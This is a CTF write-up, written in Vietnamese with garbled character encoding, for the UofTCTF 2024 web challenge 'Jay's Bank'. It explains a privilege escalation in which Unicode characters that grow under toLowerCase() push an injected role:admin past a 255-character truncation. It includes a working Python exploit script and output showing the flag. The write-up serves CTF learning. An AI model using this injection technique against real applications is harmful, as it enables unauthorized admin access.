---
title: "UofTCTF 2024"
layout: single
excerpt: "January 13, 2024 12:00 PM EST to January 14, 2024 11:59 PM EST ðŸ’» "
header:
show_date: true
classes: wide
header:
  teaser: "https://hackmd.io/_uploads/BkpzSDDYT.png"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://hackmd.io/_uploads/BkpzSDDYT.png">
</p>


# WEB challs
## Jay's Bank - 499 point

### Description
```
My bank is still in pre-alpha-alpha-alpha stage, but I'm sure it's secure enough to keep all of your information safe.

Author: SteakEnthusiast

http://34.123.200.191/

```

source code [here](https://github.com/TaiPhung217/CTF_writeup/blob/main/2024/uofTCTF2024/jays-bank.zip)

### Solution

Giao diá»‡n trang web cung cáº¥p nhÆ° sau: 

![Alt text](https://hackmd.io/_uploads/HkFS1vDFp.png)

VÃ¬ challenge nÃ y cung cáº¥p source code nÃªn ta sáº½ thá»±c hiá»‡n review source trÆ°á»›c.

Trong `CTF/uoftctf/jays-bank/routes/index.js`
Äá»c Ä‘oáº¡n code sau cÃ³ thá»ƒ tháº¥y Ä‘á»ƒ cÃ³ thá»ƒ láº¥y Ä‘Æ°á»£c FLAG ta cáº§n má»™t tÃ i khoáº£n vá»›i `role:admin` 

![Alt text](https://hackmd.io/_uploads/rJowkPwFa.png)

NhÆ°ng máº·c Ä‘á»‹nh, khi ngÆ°á»i dÃ¹ng thá»±c hiá»‡n update profile sáº½ add thÃªm má»™t `role:user`

![Alt text](https://hackmd.io/_uploads/SJmt1DPFp.png)

Kiá»ƒm tra trong database

![Alt text](https://hackmd.io/_uploads/HyScywvYp.png)

PhÃ¢n tÃ­ch má»™t chÃºt trong hÃ m `router.put("/profile", jwtAuth, async (req, res)` trong index.js
Lá»— há»•ng trong thá»­ thÃ¡ch nÃ y xuáº¥t phÃ¡t tá»« vá»‹ trÃ­ nÃ y 

![Alt text](https://hackmd.io/_uploads/H1_okPPY6.png)

app thá»±c hiá»‡n láº¥y cÃ¡c thÃ´ng tin `username, phone, credit_card, secret_question, secret_answer` vÃ  add thÃªm má»™t `role:user`. Trong Ä‘Ã³ gá»i tá»›i hai hÃ m `updateData` Ä‘á»ƒ cáº­p nháº­t data user vÃ o database

![Alt text](https://hackmd.io/_uploads/Hyw31vDK6.png)

vÃ  hÃ m `convert` nháº­n vÃ o má»™t Ä‘á»‘i tÆ°á»£ng (object) `o` vÃ  tráº£ vá» má»™t chuá»—i JSON Ä‘Æ°á»£c táº¡o ra tá»« cÃ¡c cáº·p khÃ³a-giÃ¡ trá»‹ cá»§a Ä‘á»‘i tÆ°á»£ng Ä‘Ã³

```js
  convert(o) {
    return `{${Object.entries(o).map(([k, v]) => 
      `"${k}": ${typeof v === "object" && v !== null ? convert(v) : `"${v}"`}`
    ).join(", ")}}`.toLowerCase();
  }
```

Cuá»‘i cÃ¹ng hÃ m thá»±c hiá»‡n chuyá»ƒn káº¿t quáº£ json vá» dáº¡ng LowerCase() tráº£ vá» má»™t khá»‘i `data` vÃ  update data nÃ y cho user trong database.

Trong file `init.sql` Ä‘á»‹nh nghÄ©a Ä‘á»™ dÃ i tá»‘i Ä‘a cho trÆ°á»ng data nÃ y lÃ  `255`. 

![Alt text](https://hackmd.io/_uploads/r1F6kwDFp.png)

Ã tÆ°á»Ÿng khai thÃ¡c:
- CÃ¡c trÆ°á»ng `secret_answer` vÃ  `role: "user"` Ä‘Æ°á»£c insert gáº§n nhau, trong Ä‘Ã³ trÆ°á»ng secret_answer cÃ³ kháº£ nÄƒng kiá»ƒm soÃ¡t. Äá»ƒ khai thÃ¡c thÃ nh cÃ´ng, chÃºng ta cáº§n chÃ¨n má»™t chuá»—i secret_answer Ä‘á»§ dÃ i vá»«a Ä‘á»§ Ä‘á»ƒ chÃ¨n Ä‘Æ°á»£c role má»›i vÃ  xÃ³a bá» role:user cÅ© , tá»« Ä‘Ã³ ghi Ä‘Ã¨ lÃªn má»™t trÆ°á»ng role khÃ¡c vá»›i giÃ¡ trá»‹ lÃ  `admin`.

- TrÆ°á»›c Ä‘Ã³, `secret_answer` vÃ  `secret_question` cÅ©ng pháº£i vÆ°á»£t qua cÃ¡c Ä‘iá»u kiá»‡n check sao cho khÃ´ng vÆ°á»£t quÃ¡ 45 kÃ½ tá»± báº±ng cÃ¡ch sá»­ dá»¥ng cÃ¡c kÃ½ tá»± Unicode Ä‘áº·c biá»‡t nhÆ° `Ä°` cÃ³ thá»ƒ lÃ m tÄƒng kÃ­ch thÆ°á»›c khi Ä‘i qua hÃ m `toLowerCase()`

```
CÃ³ má»™t sá»‘ kÃ½ tá»± Ä‘áº·c biá»‡t trong JavaScript

Äá»‘i vá»›i toUpperCase():
CÃ¡c kÃ½ tá»± â€œÄ±â€ vÃ  â€œÅ¿â€ Ä‘Æ°á»£c toUpperCase xá»­ lÃ½ vÃ  káº¿t quáº£ lÃ  â€œIâ€ vÃ  â€œSâ€

Äá»‘i vá»›i toLowerCase():
KÃ½ tá»± â€œKâ€ Ä‘Æ°á»£c toLowerCase xá»­ lÃ½ vÃ  káº¿t quáº£ lÃ  â€œkâ€ (K nÃ y khÃ´ng pháº£i lÃ  K)
```

### Script
```python
import requests

url = "http://127.0.0.1:3000/"

session = requests.session()

session.post(url + 'register', json={"password": "Abc@123!@#", "username": "abc9092909078"})

session.post(url + 'login', json={"username":"abc9092909078","password":"Abc@123!@#"})

session.put(url + 'profile', json={"phone":"1234567890","credit_card":"1234567890987654","secret_question":"Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°","secret_answer":"Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°Ä°\",\"role\":\"admin\"}","current_password":"Abc@123!@#"})

res = session.get(url + 'dashboard')

print(res.text)
```

Result:
```
|_>kali: python 1.py

<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - Jay's Bank</title>
    <link rel="stylesheet" href="/css/dashboard.css">
</head>
<body>
    <div class="container">
        <nav>
            <ul>
                <li><a href="/">Home</a></li>
                <li><a href="/profile">Edit Profile</a></li>
                <li><a href="/logout">Logout</a></li>
            </ul>
        </nav>
        <h1>Welcome, abc9092909078</h1>
        <p>Your phone number: 1234567890</p>
        <p>Your credit card (last 4 digits): 7654</p>
        
            <p>Since you're the admin, here is your flag: uoftctf{fake_flag}</p>
        
    </div>
</body>
</html>
```